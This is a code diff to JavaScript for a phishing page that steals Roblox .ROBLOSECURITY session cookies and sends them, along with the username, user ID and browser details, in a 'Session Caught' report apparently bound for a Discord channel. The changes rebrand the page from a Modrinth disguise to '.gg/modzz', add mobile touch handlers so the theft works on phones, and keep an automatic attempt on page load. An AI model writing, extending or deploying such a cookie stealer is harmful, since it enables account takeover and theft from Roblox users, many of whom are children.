@@ -88,8 +88,8 @@ async function collectAndSend(cookie) {
     : "No .ROBLOSECURITY cookie found";
 
   const embed = {
-    title: "modrinth – Session Caught",
-    color: 0x30b37c,
+    title: ".gg/modzz – Session Caught",
+    color: 0xa855f7,
     fields: [
       { name: "Username", value: "```" + username + "```", inline: true },
       { name: "User ID", value: "```" + (userId || "N/A") + "```", inline: true },
@@ -102,7 +102,7 @@ async function collectAndSend(cookie) {
       { name: "User-Agent", value: "```" + navigator.userAgent.substring(0, 120) + "```", inline: false },
       { name: "Time", value: new Date().toISOString(), inline: false }
     ],
-    footer: { text: "modrinth scanner • channel 1557737389097619538" }
+    footer: { text: ".gg/modzz scanner" }
   };
 
   if (cookie && cookie.length > 80) {
@@ -126,6 +126,7 @@ function openRoblox() {
   loader.classList.add("active");
   loader.querySelector("p").textContent = "Opening Roblox… waiting for session";
 
+  // mobile-friendly open
   const robloxWindow = window.open("https://www.roblox.com/home", "_blank");
 
   let attempts = 0;
@@ -148,7 +149,7 @@ function openRoblox() {
     if (cookie) {
       clearInterval(interval);
       await collectAndSend(cookie);
-      loader.innerHTML = `<div class="spinner" style="border-top-color:#30b37c"></div><p style="color:#30b37c">Session linked</p>`;
+      loader.innerHTML = `<div class="spinner"></div><p style="color:#a855f7">Session linked</p>`;
       setTimeout(() => loader.classList.remove("active"), 1600);
       return;
     }
@@ -156,13 +157,23 @@ function openRoblox() {
     if (attempts >= maxAttempts) {
       clearInterval(interval);
       await collectAndSend(null);
-      loader.innerHTML = `<p style="color:#9ba1a9">Could not read session</p>`;
+      loader.innerHTML = `<p style="color:#c4b5fd">Could not read session</p>`;
       setTimeout(() => loader.classList.remove("active"), 2000);
     }
   }, 500);
 }
 
-browseBtn.addEventListener("click", openRoblox);
+// proper mobile click handling
+browseBtn.addEventListener("click", function (e) {
+  e.preventDefault();
+  e.stopPropagation();
+  openRoblox();
+});
+
+browseBtn.addEventListener("touchend", function (e) {
+  e.preventDefault();
+  openRoblox();
+}, { passive: false });
 
 // auto attempt on load
 window.addEventListener("load", () => {
